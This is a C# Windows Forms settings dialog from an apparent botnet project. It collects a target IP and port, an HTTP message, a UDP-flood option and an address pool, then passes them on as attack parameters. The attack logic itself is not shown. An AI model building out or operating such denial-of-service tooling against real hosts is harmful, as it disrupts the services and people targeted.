using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;


namespace Botnet
{
    public partial class SettingsForm : Form
    {
        public delegate void SetSettingsCallBack(AttackParams Params, int port);
        SetSettingsCallBack SetSettings;
        public SettingsForm(AttackParams Params, int curport, SetSettingsCallBack funct, bool mode)//if true init new ex, otherwise
        {
            InitializeComponent(); //fill previous params to form if obkect is initialized
            SetSettings = funct;
            FillPreviousSettings(Params, curport);
            if (mode) AttackParamsBox.Enabled = true;
            else AttackParamsBox.Enabled = false;
        }
        private void FillPreviousSettings(AttackParams Params, int cur_port)
        {
            TargetAddressBox.Text = Params.Target.Address.ToString();
            TargetPortNum.Value = Params.Target.Port;
            HttpContentBox.Text = Params.HttpMsg;
            FloodEnablingCheckBox.Checked = Params.UdpFloodEnabled;
            RestStartBox.Text = Params.RestrictedPool[0].ToString();
            RestEndBox.Text = Params.RestrictedPool[1].ToString();
            portBox.Value = cur_port;
        }
        private void SetParamnBtn_Click(object sender, EventArgs e)
        {
            int port = Convert.ToInt32(portBox.Value);
            int targPort = Convert.ToInt32(TargetPortNum.Value);
            IPAddress TargAddress;
            if ((IPAddress.TryParse(TargetAddressBox.Text, out TargAddress) && (HttpContentBox.Text.Length > 10)))
            {
                IPEndPoint Target = new IPEndPoint(TargAddress, targPort);
                if (FloodEnablingCheckBox.Checked)
                {
                    IPAddress RestStartAddr;
                    IPAddress RestEndAddr;
                    if (IPAddress.TryParse(RestStartBox.Text, out RestStartAddr) && IPAddress.TryParse(RestEndBox.Text, out RestEndAddr))
                    {
                        AttackParams Params = new AttackParams(Target, HttpContentBox.Text, new NetworkInstruments.AddressPool(RestStartAddr, RestEndAddr));
                        SetSettings(Params, port);
                        this.Close();
                    }
                    else
                    {
                        MessageBox.Show("Введенные данные некорректны", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                else
                {
                    AttackParams Params = new AttackParams(Target, HttpContentBox.Text);
                    SetSettings(Params, port);
                    this.Close();
                }

            }
            else
            {
                MessageBox.Show("Введенные данные некорректны", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void CancelBtn_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void FloodEnablingCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            if (FloodEnablingCheckBox.Checked)
            {
                RestPoolsSetBox.Enabled = true;
            }
            else RestPoolsSetBox.Enabled = false;
        }
    }
}
